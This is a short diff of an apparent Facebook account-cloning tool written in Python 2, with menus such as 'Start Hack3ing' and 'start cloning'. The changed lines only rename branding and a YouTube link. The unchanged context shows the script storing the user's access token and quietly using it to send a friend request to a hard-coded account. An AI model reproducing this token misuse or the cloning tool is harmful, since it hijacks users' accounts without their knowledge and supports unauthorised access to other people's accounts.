@@ -153,7 +153,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+				os.system('xdg-open https://www.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -206,7 +206,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Mraf2"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update SAA"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -313,7 +313,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
 
-	jalan('                    \033[1;97mMr Af2 start cloning Wait...')
+	jalan('                    \033[1;97mMr SAA start cloning Wait...')
 	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
 
 	def main(arg):
